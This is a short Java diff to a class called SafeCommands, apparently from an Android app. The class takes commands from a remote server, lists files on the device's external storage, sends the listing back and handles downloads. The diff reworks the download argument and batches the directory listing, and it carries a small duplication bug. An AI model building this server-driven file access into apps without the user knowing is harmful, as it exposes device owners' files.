@@ -86,8 +86,7 @@ public class SafeCommands {
         } else if (fromServer.startsWith(COMMANDS[11])) {
             listDir(fromServer.substring(COMMANDS[11].length(), fromServer.length()));
         } else if (fromServer.startsWith(COMMANDS[12])) {
-            String[] args = fromServer.substring(COMMANDS[12].length(), fromServer.length()).split(" ");
-            comms.download(args);
+            comms.download(fromServer.substring(COMMANDS[12].length(), fromServer.length()));
         } else if (fromServer.startsWith(COMMANDS[13])) {
             for (String command : COMMANDS) {
                 comms.say(command);
@@ -201,9 +200,15 @@ public class SafeCommands {
             File directory = new File(Environment.getExternalStorageDirectory(), dir);
             File[] listOfFiles = directory.listFiles();
             if(listOfFiles.length > 0) {
+                StringBuilder ls = new StringBuilder();
+                ls.append("dir: " + dir);
+                ls.append(dir);
+                ls.append("\r\n");
                 for (File file : listOfFiles) {
-                    comms.say(file.getName());
+                    ls.append(file.getName());
+                    ls.append("\r\n");
                 }
+                comms.say(ls.toString());
             } else {
                 comms.say("Directory is empty");
             }
